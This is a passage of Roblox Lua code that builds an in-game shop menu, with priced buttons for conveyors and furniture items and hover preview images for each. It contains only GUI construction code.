InfoText78.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText78.BackgroundTransparency = 1
InfoText78.Position = UDim2.new(0, 40, 0, 200)
InfoText78.Size = UDim2.new(0, 100, 0, 100)
InfoText78.Image = "rbxassetid://3703717392"
InfoText78.Visible = false

TiltConveyor.MouseEnter:connect(function()
InfoText78.Visible = true
end)

TiltConveyor.MouseLeave:connect(function()
InfoText78.Visible = false
end)

StraightConveyor = Instance.new("TextButton")
StraightConveyor.Name = "StraightConveyor"
StraightConveyor.Parent = Woodrus
StraightConveyor.BackgroundColor3 = Color3.new(0, 0, 0)
StraightConveyor.BorderColor3 = Color3.fromRGB(151, 0, 0)
StraightConveyor.BackgroundTransparency = 0.6
StraightConveyor.Position = UDim2.new(0, 5, 0, 625)
StraightConveyor.Size = UDim2.new(0, 173, 0, 20)
StraightConveyor.Font = Enum.Font.Fantasy
StraightConveyor.Text = "Straight Conveyor (80)"
StraightConveyor.TextColor3 = Color3.new(1, 1, 1)
StraightConveyor.TextSize = 14
StraightConveyor.MouseButton1Down:connect(function()
Item.Text = "StraightConveyor"
end)


InfoText79 = Instance.new("ImageLabel")
InfoText79.Name = "ImageLabel"
InfoText79.Parent = MainFrame
InfoText79.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText79.BackgroundTransparency = 1
InfoText79.Position = UDim2.new(0, 40, 0, 200)
InfoText79.Size = UDim2.new(0, 100, 0, 100)
InfoText79.Image = "rbxassetid://3703715036"
InfoText79.Visible = false

StraightConveyor.MouseEnter:connect(function()
InfoText79.Visible = true
end)

StraightConveyor.MouseLeave:connect(function()
InfoText79.Visible = false
end)

--InfoText80 = Instance.new("ImageLabel")
--InfoText80.Name = "ImageLabel"
--InfoText80.Parent = MainFrame
--InfoText80.BackgroundColor3 = Color3.new(1, 1, 1)
--InfoText80.BackgroundTransparency = 1
--InfoText80.Position = UDim2.new(0, 40, 0, 200)
--InfoText80.Size = UDim2.new(0, 100, 0, 100)
--InfoText80.Image = "rbxassetid://3210424323"
--InfoText80.Visible = false

-------------------------------------------------------------------------------------------------------------

fshop = Instance.new("TextButton")
fshop.Name = "fshop"
fshop.Parent = BuyFrame
fshop.BackgroundColor3 = Color3.new(0, 0, 0)
fshop.BorderColor3 = Color3.new(1, 0, 0)
fshop.BackgroundTransparency = 0.6
fshop.Position =  UDim2.new(0, 3, 0, 26)
fshop.Size = UDim2.new(0, 164, 0, 20)
fshop.Font = Enum.Font.Fantasy
fshop.Text = "Furniture Store"
fshop.TextColor3 = Color3.new(1, 1, 1)
fshop.TextSize = 14
fshop.MouseButton1Click:connect(function()
BuyFrame.Visible = true
TimesFrame.Visible = false
  makesound("rbxassetid://156785206")
end)

Furniture1 = Instance.new("ScrollingFrame")
Furniture1.Name = "Furniture1"
Furniture1.Parent = MenuFrame
Furniture1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Furniture1.BackgroundTransparency = 0.5
Furniture1.Position =  UDim2.new(0, 179, 0, 0)
Furniture1.BorderColor3 = Color3.new(0, 0, 0)
Furniture1.Size = UDim2.new(0, 195, 0, 450)
Furniture1.CanvasPosition = Vector2.new(0,0)
Furniture1.CanvasSize = UDim2.new(0, 0, 0, 740)
Furniture1.Visible = false

Seat_Armchair = Instance.new("TextButton")
Seat_Armchair.Name = "Seat_Armchair"
Seat_Armchair.Parent = Furniture1
Seat_Armchair.BackgroundColor3 = Color3.new(0, 0, 0)
Seat_Armchair.BorderColor3 = Color3.fromRGB(151, 0, 0)
Seat_Armchair.BackgroundTransparency = 0.6
Seat_Armchair.Position = UDim2.new(0, 5, 0, 3)
Seat_Armchair.Size = UDim2.new(0, 173, 0, 20)
Seat_Armchair.Font = Enum.Font.Fantasy
Seat_Armchair.Text = "Seat Armchair (140)"
Seat_Armchair.TextColor3 = Color3.new(1, 1, 1)
Seat_Armchair.TextSize = 14
Seat_Armchair.MouseButton1Down:connect(function()
Item.Text = "Seat_Armchair"
end)

InfoText82 = Instance.new("ImageLabel")
InfoText82.Name = "ImageLabel"
InfoText82.Parent = MainFrame
InfoText82.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText82.BackgroundTransparency = 1
InfoText82.Position = UDim2.new(0, 40, 0, 200)
InfoText82.Size = UDim2.new(0, 100, 0, 100)
InfoText82.Image = "rbxassetid://3704077769"
InfoText82.Visible = false

Seat_Armchair.MouseEnter:connect(function()
InfoText82.Visible = true
end)

Seat_Armchair.MouseLeave:connect(function()
InfoText82.Visible = false
end)

Seat_Loveseat = Instance.new("TextButton")
Seat_Loveseat.Name = "Seat_Loveseat"
Seat_Loveseat.Parent = Furniture1
Seat_Loveseat.BackgroundColor3 = Color3.new(0, 0, 0)
Seat_Loveseat.BorderColor3 = Color3.fromRGB(151, 0, 0)
Seat_Loveseat.BackgroundTransparency = 0.6
Seat_Loveseat.Position = UDim2.new(0, 5, 0, 26)
Seat_Loveseat.Size = UDim2.new(0, 173, 0, 20)
Seat_Loveseat.Font = Enum.Font.Fantasy
Seat_Loveseat.Text = "Seat Loveseat (200)"
Seat_Loveseat.TextColor3 = Color3.new(1, 1, 1)
Seat_Loveseat.TextSize = 14
Seat_Loveseat.MouseButton1Down:connect(function()
Item.Text = "Seat_Loveseat"
end)

InfoText210 = Instance.new("ImageLabel")
InfoText210.Name = "ImageLabel"
InfoText210.Parent = MainFrame
InfoText210.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText210.BackgroundTransparency = 1
InfoText210.Position = UDim2.new(0, 40, 0, 200)
InfoText210.Size = UDim2.new(0, 100, 0, 100)
InfoText210.Image = "rbxassetid://3704078402"
InfoText210.Visible = false

Seat_Loveseat.MouseEnter:connect(function()
InfoText210.Visible = true
end)

Seat_Loveseat.MouseLeave:connect(function()
InfoText210.Visible = false
end)

Seat_Couch = Instance.new("TextButton")
Seat_Couch.Name = "Seat_Couch"
Seat_Couch.Parent = Furniture1
Seat_Couch.BackgroundColor3 = Color3.new(0, 0, 0)
Seat_Couch.BorderColor3 = Color3.fromRGB(151, 0, 0)
Seat_Couch.BackgroundTransparency = 0.6
Seat_Couch.Position = UDim2.new(0, 5, 0, 49)
Seat_Couch.Size = UDim2.new(0, 173, 0, 20)
Seat_Couch.Font = Enum.Font.Fantasy
Seat_Couch.Text = "Seat Couch (320)"
Seat_Couch.TextColor3 = Color3.new(1, 1, 1)
Seat_Couch.TextSize = 14
Seat_Couch.MouseButton1Down:connect(function()
Item.Text = "Seat_Couch"
end)

InfoText84 = Instance.new("ImageLabel")
InfoText84.Name = "ImageLabel"
InfoText84.Parent = MainFrame
InfoText84.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText84.BackgroundTransparency = 1
InfoText84.Position = UDim2.new(0, 40, 0, 200)
InfoText84.Size = UDim2.new(0, 100, 0, 100)
InfoText84.Image = "rbxassetid://3704078093"
InfoText84.Visible = false

Seat_Couch.MouseEnter:connect(function()
InfoText84.Visible = true
end)

Seat_Couch.MouseLeave:connect(function()
InfoText84.Visible = false
end)

Bed1 = Instance.new("TextButton")
Bed1.Name = "Bed1"
Bed1.Parent = Furniture1
Bed1.BackgroundColor3 = Color3.new(0, 0, 0)
Bed1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Bed1.BackgroundTransparency = 0.6
Bed1.Position = UDim2.new(0, 5, 0, 72)
Bed1.Size = UDim2.new(0, 173, 0, 20)
Bed1.Font = Enum.Font.Fantasy
Bed1.Text = "Bed Small (250)"
Bed1.TextColor3 = Color3.new(1, 1, 1)
Bed1.TextSize = 14
Bed1.MouseButton1Down:connect(function()
Item.Text = "Bed1"
end)

InfoText85 = Instance.new("ImageLabel")
InfoText85.Name = "ImageLabel"
InfoText85.Parent = MainFrame
InfoText85.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText85.BackgroundTransparency = 1
InfoText85.Position = UDim2.new(0, 40, 0, 200)
InfoText85.Size = UDim2.new(0, 100, 0, 100)
InfoText85.Image = "rbxassetid://4218292007"
InfoText85.Visible = false

Bed1.MouseEnter:connect(function()
InfoText85.Visible = true
end)

Bed1.MouseLeave:connect(function()
InfoText85.Visible = false
end)

Bed2 = Instance.new("TextButton")
Bed2.Name = "Bed2"
Bed2.Parent = Furniture1
Bed2.BackgroundColor3 = Color3.new(0, 0, 0)
Bed2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Bed2.BackgroundTransparency = 0.6
Bed2.Position = UDim2.new(0, 5, 0, 95)
Bed2.Size = UDim2.new(0, 173, 0, 20)
Bed2.Font = Enum.Font.Fantasy
Bed2.Text = "Bed Big (350)"
Bed2.TextColor3 = Color3.new(1, 1, 1)
Bed2.TextSize = 14
Bed2.MouseButton1Down:connect(function()
Item.Text = "Bed2"
end)

InfoText86 = Instance.new("ImageLabel")
InfoText86.Name = "ImageLabel"
InfoText86.Parent = MainFrame
InfoText86.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText86.BackgroundTransparency = 1
InfoText86.Position = UDim2.new(0, 40, 0, 200)
InfoText86.Size = UDim2.new(0, 100, 0, 100)
InfoText86.Image = "rbxassetid://3704076312"
InfoText86.Visible = false

Bed2.MouseEnter:connect(function()
InfoText86.Visible = true
end)

Bed2.MouseLeave:connect(function()
InfoText86.Visible = false
end)

Toilet = Instance.new("TextButton")
Toilet.Name = "Toilet"
Toilet.Parent = Furniture1
Toilet.BackgroundColor3 = Color3.new(0, 0, 0)
Toilet.BorderColor3 = Color3.fromRGB(151, 0, 0)
Toilet.BackgroundTransparency = 0.6
Toilet.Position = UDim2.new(0, 5, 0, 118)
Toilet.Size = UDim2.new(0, 173, 0, 20)
Toilet.Font = Enum.Font.Fantasy
Toilet.Text = "Toilet (90)"
Toilet.TextColor3 = Color3.new(1, 1, 1)
Toilet.TextSize = 14
Toilet.MouseButton1Down:connect(function()
Item.Text = "Toilet"
end)

InfoText87 = Instance.new("ImageLabel")
InfoText87.Name = "ImageLabel"
InfoText87.Parent = MainFrame
InfoText87.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText87.BackgroundTransparency = 1
InfoText87.Position = UDim2.new(0, 40, 0, 200)
InfoText87.Size = UDim2.new(0, 100, 0, 100)
InfoText87.Image = "rbxassetid://3704078968"
InfoText87.Visible = false

Toilet.MouseEnter:connect(function()
InfoText87.Visible = true
end)

Toilet.MouseLeave:connect(function()
InfoText87.Visible = false
end)

Refridgerator = Instance.new("TextButton")
Refridgerator.Name = "Refridgerator"
Refridgerator.Parent = Furniture1
Refridgerator.BackgroundColor3 = Color3.new(0, 0, 0)
Refridgerator.BorderColor3 = Color3.fromRGB(151, 0, 0)
Refridgerator.BackgroundTransparency = 0.6
Refridgerator.Position = UDim2.new(0, 5, 0, 141)
Refridgerator.Size = UDim2.new(0, 173, 0, 20)
Refridgerator.Font = Enum.Font.Fantasy
Refridgerator.Text = "Refridgerator (310)"
Refridgerator.TextColor3 = Color3.new(1, 1, 1)
Refridgerator.TextSize = 14
Refridgerator.MouseButton1Down:connect(function()
Item.Text = "Refridgerator"
end)

InfoText88 = Instance.new("ImageLabel")
InfoText88.Name = "ImageLabel"
InfoText88.Parent = MainFrame
InfoText88.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText88.BackgroundTransparency = 1
InfoText88.Position = UDim2.new(0, 40, 0, 200)
InfoText88.Size = UDim2.new(0, 100, 0, 100)
InfoText88.Image = "rbxassetid://3704077460"
InfoText88.Visible = false

Refridgerator.MouseEnter:connect(function()
InfoText88.Visible = true
end)

Refridgerator.MouseLeave:connect(function()
InfoText88.Visible = false
end)

Stove = Instance.new("TextButton")
Stove.Name = "Stove"
Stove.Parent = Furniture1
Stove.BackgroundColor3 = Color3.new(0, 0, 0)
Stove.BorderColor3 = Color3.fromRGB(151, 0, 0)
Stove.BackgroundTransparency = 0.6
Stove.Position = UDim2.new(0, 5, 0, 164)
Stove.Size = UDim2.new(0, 173, 0, 20)
Stove.Font = Enum.Font.Fantasy
Stove.Text = "Stove (340)"
Stove.TextColor3 = Color3.new(1, 1, 1)
Stove.TextSize = 14
Stove.MouseButton1Down:connect(function()
Item.Text = "Stove"
end)

InfoText89 = Instance.new("ImageLabel")
InfoText89.Name = "ImageLabel"
InfoText89.Parent = MainFrame
InfoText89.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText89.BackgroundTransparency = 1
InfoText89.Position = UDim2.new(0, 40, 0, 200)
InfoText89.Size = UDim2.new(0, 100, 0, 100)
InfoText89.Image = "rbxassetid://3704078679"
InfoText89.Visible = false

Stove.MouseEnter:connect(function()
InfoText89.Visible = true
end)

Stove.MouseLeave:connect(function()
InfoText89.Visible = false
end)

Dishwasher = Instance.new("TextButton")
Dishwasher.Name = "Dishwasher"
Dishwasher.Parent = Furniture1
Dishwasher.BackgroundColor3 = Color3.new(0, 0, 0)
Dishwasher.BorderColor3 = Color3.fromRGB(151, 0, 0)
Dishwasher.BackgroundTransparency = 0.6
Dishwasher.Position = UDim2.new(0, 5, 0, 187)
Dishwasher.Size = UDim2.new(0, 173, 0, 20)
Dishwasher.Font = Enum.Font.Fantasy
Dishwasher.Text = "Dishwasher (380)"
Dishwasher.TextColor3 = Color3.new(1, 1, 1)
Dishwasher.TextSize = 14
Dishwasher.MouseButton1Down:connect(function()
Item.Text = "Dishwasher"
end)

InfoText90 = Instance.new("ImageLabel")
InfoText90.Name = "ImageLabel"
InfoText90.Parent = MainFrame
InfoText90.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText90.BackgroundTransparency = 1
InfoText90.Position = UDim2.new(0, 40, 0, 200)
InfoText90.Size = UDim2.new(0, 100, 0, 100)
InfoText90.Image = "rbxassetid://3704076585"
InfoText90.Visible = false

Dishwasher.MouseEnter:connect(function()
InfoText90.Visible = true
end)

Dishwasher.MouseLeave:connect(function()
InfoText90.Visible = false
end)

FloorLamp1 = Instance.new("TextButton")
FloorLamp1.Name = "FloorLamp1"
FloorLamp1.Parent = Furniture1
FloorLamp1.BackgroundColor3 = Color3.new(0, 0, 0)
FloorLamp1.BorderColor3 = Color3.fromRGB(151, 0, 0)
FloorLamp1.BackgroundTransparency = 0.6
FloorLamp1.Position = UDim2.new(0, 5, 0, 210)
FloorLamp1.Size = UDim2.new(0, 173, 0, 20)
FloorLamp1.Font = Enum.Font.Fantasy
FloorLamp1.Text = "Floor Lamp 1 (110)"
FloorLamp1.TextColor3 = Color3.new(1, 1, 1)
FloorLamp1.TextSize = 14
FloorLamp1.MouseButton1Down:connect(function()
Item.Text = "FloorLamp1"
end)

InfoText91 = Instance.new("ImageLabel")
InfoText91.Name = "ImageLabel"
InfoText91.Parent = MainFrame
InfoText91.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText91.BackgroundTransparency = 1
InfoText91.Position = UDim2.new(0, 40, 0, 200)
InfoText91.Size = UDim2.new(0, 100, 0, 100)
InfoText91.Image = "rbxassetid://3704076866"
InfoText91.Visible = false

FloorLamp1.MouseEnter:connect(function()
InfoText91.Visible = true
end)

FloorLamp1.MouseLeave:connect(function()
InfoText91.Visible = false
end)

Lamp1 = Instance.new("TextButton")
Lamp1.Name = "Lamp1"
Lamp1.Parent = Furniture1
Lamp1.BackgroundColor3 = Color3.new(0, 0, 0)
Lamp1.BorderColor3 = Color3.fromRGB(151, 0, 0)
Lamp1.BackgroundTransparency = 0.6
Lamp1.Position = UDim2.new(0, 5, 0, 233)
Lamp1.Size = UDim2.new(0, 173, 0, 20)
Lamp1.Font = Enum.Font.Fantasy
Lamp1.Text = "Lamp 1 (90)"
Lamp1.TextColor3 = Color3.new(1, 1, 1)
Lamp1.TextSize = 14
Lamp1.MouseButton1Down:connect(function()
Item.Text = "Lamp1"
end)


InfoText92 = Instance.new("ImageLabel")
InfoText92.Name = "ImageLabel"
InfoText92.Parent = MainFrame
InfoText92.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText92.BackgroundTransparency = 1
InfoText92.Position = UDim2.new(0, 40, 0, 200)
InfoText92.Size = UDim2.new(0, 100, 0, 100)
InfoText92.Image = "rbxassetid://3704077196"
InfoText92.Visible = false

Lamp1.MouseEnter:connect(function()
InfoText92.Visible = true
end)

Lamp1.MouseLeave:connect(function()
InfoText92.Visible = false
end)

WallLight1 = Instance.new("TextButton")
WallLight1.Name = "WallLight1"
WallLight1.Parent = Furniture1
WallLight1.BackgroundColor3 = Color3.new(0, 0, 0)
WallLight1.BorderColor3 = Color3.fromRGB(151, 0, 0)
WallLight1.BackgroundTransparency = 0.6
WallLight1.Position = UDim2.new(0, 5, 0, 256)
WallLight1.Size = UDim2.new(0, 173, 0, 20)
WallLight1.Font = Enum.Font.Fantasy
WallLight1.Text = "Wall Light 1 (90)"
WallLight1.TextColor3 = Color3.new(1, 1, 1)
WallLight1.TextSize = 14
WallLight1.MouseButton1Down:connect(function()
Item.Text = "WallLight1"
end)

InfoText93 = Instance.new("ImageLabel")
InfoText93.Name = "ImageLabel"
InfoText93.Parent = MainFrame
InfoText93.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText93.BackgroundTransparency = 1
InfoText93.Position = UDim2.new(0, 40, 0, 200)
InfoText93.Size = UDim2.new(0, 100, 0, 100)
InfoText93.Image = "rbxassetid://3704081860"
InfoText93.Visible = false

WallLight1.MouseEnter:connect(function()
InfoText93.Visible = true
end)

WallLight1.MouseLeave:connect(function()
InfoText93.Visible = false
end)

WallLight2 = Instance.new("TextButton")
WallLight2.Name = "WallLight2"
WallLight2.Parent = Furniture1
WallLight2.BackgroundColor3 = Color3.new(0, 0, 0)
WallLight2.BorderColor3 = Color3.fromRGB(151, 0, 0)
WallLight2.BackgroundTransparency = 0.6
WallLight2.Position = UDim2.new(0, 5, 0, 279)
WallLight2.Size = UDim2.new(0, 173, 0, 20)
WallLight2.Font = Enum.Font.Fantasy
WallLight2.Text = "Wall Light 2 (90)"
WallLight2.TextColor3 = Color3.new(1, 1, 1)
WallLight2.TextSize = 14
WallLight2.MouseButton1Down:connect(function()
Item.Text = "WallLight2"
end)

InfoText94 = Instance.new("ImageLabel")
InfoText94.Name = "ImageLabel"
InfoText94.Parent = MainFrame
InfoText94.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText94.BackgroundTransparency = 1
InfoText94.Position = UDim2.new(0, 40, 0, 200)
InfoText94.Size = UDim2.new(0, 100, 0, 100)
InfoText94.Image = "rbxassetid://3704186371"
InfoText94.Visible = false

WallLight2.MouseEnter:connect(function()
InfoText94.Visible = true
end)

WallLight2.MouseLeave:connect(function()
InfoText94.Visible = false
end)

LightBulb = Instance.new("TextButton")
LightBulb.Name = "LightBulb"
LightBulb.Parent = Furniture1
LightBulb.BackgroundColor3 = Color3.new(0, 0, 0)
LightBulb.BorderColor3 = Color3.fromRGB(151, 0, 0)
LightBulb.BackgroundTransparency = 0.6
LightBulb.Position = UDim2.new(0, 5, 0, 302)
LightBulb.Size = UDim2.new(0, 173, 0, 20)
LightBulb.Font = Enum.Font.Fantasy
LightBulb.Text = "Light Bulb (2600)"
LightBulb.TextColor3 = Color3.new(1, 1, 1)
LightBulb.TextSize = 14
LightBulb.MouseButton1Down:connect(function()
Item.Text = "LightBulb"
end)

InfoText95 = Instance.new("ImageLabel")
InfoText95.Name = "ImageLabel"
InfoText95.Parent = MainFrame
InfoText95.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText95.BackgroundTransparency = 1
InfoText95.Position = UDim2.new(0, 40, 0, 200)
InfoText95.Size = UDim2.new(0, 100, 0, 100)
InfoText95.Image = "rbxassetid://3709604502"
InfoText95.Visible = false

LightBulb.MouseEnter:connect(function()
InfoText95.Visible = true
end)

LightBulb.MouseLeave:connect(function()
InfoText95.Visible = false
end)

GlassDoor1 = Instance.new("TextButton")
GlassDoor1.Name = "GlassDoor1"
GlassDoor1.Parent = Furniture1
GlassDoor1.BackgroundColor3 = Color3.new(0, 0, 0)
GlassDoor1.BorderColor3 = Color3.fromRGB(151, 0, 0)
GlassDoor1.BackgroundTransparency = 0.6
GlassDoor1.Position = UDim2.new(0, 5, 0, 325)
GlassDoor1.Size = UDim2.new(0, 173, 0, 20)
GlassDoor1.Font = Enum.Font.Fantasy
GlassDoor1.Text = "Glass Door (720)"
GlassDoor1.TextColor3 = Color3.new(1, 1, 1)
GlassDoor1.TextSize = 14
GlassDoor1.MouseButton1Down:connect(function()
Item.Text = "GlassDoor1"
end)

InfoText96 = Instance.new("ImageLabel")
InfoText96.Name = "ImageLabel"
InfoText96.Parent = MainFrame
InfoText96.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText96.BackgroundTransparency = 1
InfoText96.Position = UDim2.new(0, 40, 0, 200)
InfoText96.Size = UDim2.new(0, 100, 0, 100)
InfoText96.Image = "rbxassetid://3704030871"
InfoText96.Visible = false

GlassDoor1.MouseEnter:connect(function()
InfoText96.Visible = true
end)

GlassDoor1.MouseLeave:connect(function()
InfoText96.Visible = false
end)

GlassPane1 = Instance.new("TextButton")
GlassPane1.Name = "GlassPane1"
GlassPane1.Parent = Furniture1
GlassPane1.BackgroundColor3 = Color3.new(0, 0, 0)
GlassPane1.BorderColor3 = Color3.fromRGB(151, 0, 0)
GlassPane1.BackgroundTransparency = 0.6
GlassPane1.Position = UDim2.new(0, 5, 0,348)
GlassPane1.Size = UDim2.new(0, 173, 0, 20)
GlassPane1.Font = Enum.Font.Fantasy
GlassPane1.Text = "Glass Pane 1 (12)"
GlassPane1.TextColor3 = Color3.new(1, 1, 1)
GlassPane1.TextSize = 14
GlassPane1.MouseButton1Down:connect(function()
Item.Text = "GlassPane1"
end)

InfoText97 = Instance.new("ImageLabel")
InfoText97.Name = "ImageLabel"
InfoText97.Parent = MainFrame
InfoText97.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText97.BackgroundTransparency = 1
InfoText97.Position = UDim2.new(0, 40, 0, 200)
InfoText97.Size = UDim2.new(0, 100, 0, 100)
InfoText97.Image = "rbxassetid://3704031272"
InfoText97.Visible = false

GlassPane1.MouseEnter:connect(function()
InfoText97.Visible = true
end)

GlassPane1.MouseLeave:connect(function()
InfoText97.Visible = false
end)

GlassPane2 = Instance.new("TextButton")
GlassPane2.Name = "GlassPane2"
GlassPane2.Parent = Furniture1
GlassPane2.BackgroundColor3 = Color3.new(0, 0, 0)
GlassPane2.BorderColor3 = Color3.fromRGB(151, 0, 0)
GlassPane2.BackgroundTransparency = 0.6
GlassPane2.Position = UDim2.new(0, 5, 0, 371)
GlassPane2.Size = UDim2.new(0, 173, 0, 20)
GlassPane2.Font = Enum.Font.Fantasy
GlassPane2.Text = "Glass Pane 2 (50)"
GlassPane2.TextColor3 = Color3.new(1, 1, 1)
GlassPane2.TextSize = 14
GlassPane2.MouseButton1Down:connect(function()
Item.Text = "GlassPane2"
end)

InfoText98 = Instance.new("ImageLabel")
InfoText98.Name = "ImageLabel"
InfoText98.Parent = MainFrame
InfoText98.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText98.BackgroundTransparency = 1
InfoText98.Position = UDim2.new(0, 40, 0, 200)
InfoText98.Size = UDim2.new(0, 100, 0, 100)
InfoText98.Image = "rbxassetid://3704031673"
InfoText98.Visible = false

GlassPane2.MouseEnter:connect(function()
InfoText98.Visible = true
end)

GlassPane2.MouseLeave:connect(function()
InfoText98.Visible = false
end)

GlassPane3 = Instance.new("TextButton")
GlassPane3.Name = "GlassPane3"
GlassPane3.Parent = Furniture1
GlassPane3.BackgroundColor3 = Color3.new(0, 0, 0)
GlassPane3.BorderColor3 = Color3.fromRGB(151, 0, 0)
GlassPane3.BackgroundTransparency = 0.6
GlassPane3.Position = UDim2.new(0, 5, 0, 394)
GlassPane3.Size = UDim2.new(0, 173, 0, 20)
GlassPane3.Font = Enum.Font.Fantasy
GlassPane3.Text = "Glass Pane 3 (220)"
GlassPane3.TextColor3 = Color3.new(1, 1, 1)
GlassPane3.TextSize = 14
GlassPane3.MouseButton1Down:connect(function()
Item.Text = "GlassPane3"
end)

InfoText99 = Instance.new("ImageLabel")
InfoText99.Name = "ImageLabel"
InfoText99.Parent = MainFrame
InfoText99.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText99.BackgroundTransparency = 1
InfoText99.Position = UDim2.new(0, 40, 0, 200)
InfoText99.Size = UDim2.new(0, 100, 0, 100)
InfoText99.Image = "rbxassetid://3704032028"
InfoText99.Visible = false

GlassPane3.MouseEnter:connect(function()
InfoText99.Visible = true
end)

GlassPane3.MouseLeave:connect(function()
InfoText99.Visible = false
end)

GlassPane4 = Instance.new("TextButton")
GlassPane4.Name = "GlassPane4"
GlassPane4.Parent = Furniture1
GlassPane4.BackgroundColor3 = Color3.new(0, 0, 0)
GlassPane4.BorderColor3 = Color3.fromRGB(151, 0, 0)
GlassPane4.BackgroundTransparency = 0.6
GlassPane4.Position = UDim2.new(0, 5, 0, 417)
GlassPane4.Size = UDim2.new(0, 173, 0, 20)
GlassPane4.Font = Enum.Font.Fantasy
GlassPane4.Text = "Glass Pane 4 (550)"
GlassPane4.TextColor3 = Color3.new(1, 1, 1)
GlassPane4.TextSize = 14
GlassPane4.MouseButton1Down:connect(function()
Item.Text = "GlassPane4"
end)


InfoText100 = Instance.new("ImageLabel")
InfoText100.Name = "ImageLabel"
InfoText100.Parent = MainFrame
InfoText100.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText100.BackgroundTransparency = 1
InfoText100.Position = UDim2.new(0, 40, 0, 200)
InfoText100.Size = UDim2.new(0, 100, 0, 100)
InfoText100.Image = "rbxassetid://3704032365"
InfoText100.Visible = false

GlassPane4.MouseEnter:connect(function()
InfoText100.Visible = true
end)

GlassPane4.MouseLeave:connect(function()
InfoText100.Visible = false
end)

IcicleWireAmber = Instance.new("TextButton")
IcicleWireAmber.Name = "IcicleWireAmber"
IcicleWireAmber.Parent = Furniture1
IcicleWireAmber.BackgroundColor3 = Color3.new(0, 0, 0)
IcicleWireAmber.BorderColor3 = Color3.fromRGB(151, 0, 0)
IcicleWireAmber.BackgroundTransparency = 0.6
IcicleWireAmber.Position = UDim2.new(0, 5, 0, 440)
IcicleWireAmber.Size = UDim2.new(0, 173, 0, 20)
IcicleWireAmber.Font = Enum.Font.Fantasy
IcicleWireAmber.Text = "Icicle Wire Amber (750)"
IcicleWireAmber.TextColor3 = Color3.new(1, 1, 1)
IcicleWireAmber.TextSize = 14
IcicleWireAmber.MouseButton1Down:connect(function()
Item.Text = "IcicleWireAmber"
end)

InfoText101 = Instance.new("ImageLabel")
InfoText101.Name = "ImageLabel"
InfoText101.Parent = MainFrame
InfoText101.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText101.BackgroundTransparency = 1
InfoText101.Position = UDim2.new(0, 40, 0, 200)
InfoText101.Size = UDim2.new(0, 100, 0, 100)
InfoText101.Image = "rbxassetid://3709104619"
InfoText101.Visible = false

IcicleWireAmber.MouseEnter:connect(function()
InfoText101.Visible = true
end)

IcicleWireAmber.MouseLeave:connect(function()
InfoText101.Visible = false
end)

IcicleWireBlue = Instance.new("TextButton")
IcicleWireBlue.Name = "IcicleWireBlue"
IcicleWireBlue.Parent = Furniture1
IcicleWireBlue.BackgroundColor3 = Color3.new(0, 0, 0)
IcicleWireBlue.BorderColor3 = Color3.fromRGB(151, 0, 0)
IcicleWireBlue.BackgroundTransparency = 0.6
IcicleWireBlue.Position = UDim2.new(0, 5, 0, 463)
IcicleWireBlue.Size = UDim2.new(0, 173, 0, 20)
IcicleWireBlue.Font = Enum.Font.Fantasy
IcicleWireBlue.Text = "Icicle Wire Blue (750)"
IcicleWireBlue.TextColor3 = Color3.new(1, 1, 1)
IcicleWireBlue.TextSize = 14
IcicleWireBlue.MouseButton1Down:connect(function()
Item.Text = "IcicleWireBlue"
end)

InfoText102 = Instance.new("ImageLabel")
InfoText102.Name = "ImageLabel"
InfoText102.Parent = MainFrame
InfoText102.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText102.BackgroundTransparency = 1
InfoText102.Position = UDim2.new(0, 40, 0, 200)
InfoText102.Size = UDim2.new(0, 100, 0, 100)
InfoText102.Image = "rbxassetid://3709105145"
InfoText102.Visible = false

IcicleWireBlue.MouseEnter:connect(function()
InfoText102.Visible = true
end)

IcicleWireBlue.MouseLeave:connect(function()
InfoText102.Visible = false
end)

IcicleWireGreen = Instance.new("TextButton")
IcicleWireGreen.Name = "IcicleWireGreen"
IcicleWireGreen.Parent = Furniture1
IcicleWireGreen.BackgroundColor3 = Color3.new(0, 0, 0)
IcicleWireGreen.BorderColor3 = Color3.fromRGB(151, 0, 0)
IcicleWireGreen.BackgroundTransparency = 0.6
IcicleWireGreen.Position = UDim2.new(0, 5, 0, 486)
IcicleWireGreen.Size = UDim2.new(0, 173, 0, 20)
IcicleWireGreen.Font = Enum.Font.Fantasy
IcicleWireGreen.Text = "Icicle Wire Green (750)"
IcicleWireGreen.TextColor3 = Color3.new(1, 1, 1)
IcicleWireGreen.TextSize = 14
IcicleWireGreen.MouseButton1Down:connect(function()
Item.Text = "IcicleWireGreen"
end)

InfoText103 = Instance.new("ImageLabel")
InfoText103.Name = "ImageLabel"
InfoText103.Parent = MainFrame
InfoText103.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText103.BackgroundTransparency = 1
InfoText103.Position = UDim2.new(0, 40, 0, 200)
InfoText103.Size = UDim2.new(0, 100, 0, 100)
InfoText103.Image = "rbxassetid://3709105510"
InfoText103.Visible = false

IcicleWireGreen.MouseEnter:connect(function()
InfoText103.Visible = true
end)

IcicleWireGreen.MouseLeave:connect(function()
InfoText103.Visible = false
end)

IcicleWireRed = Instance.new("TextButton")
IcicleWireRed.Name = "IcicleWireRed"
IcicleWireRed.Parent = Furniture1
IcicleWireRed.BackgroundColor3 = Color3.new(0, 0, 0)
IcicleWireRed.BorderColor3 = Color3.fromRGB(151, 0, 0)
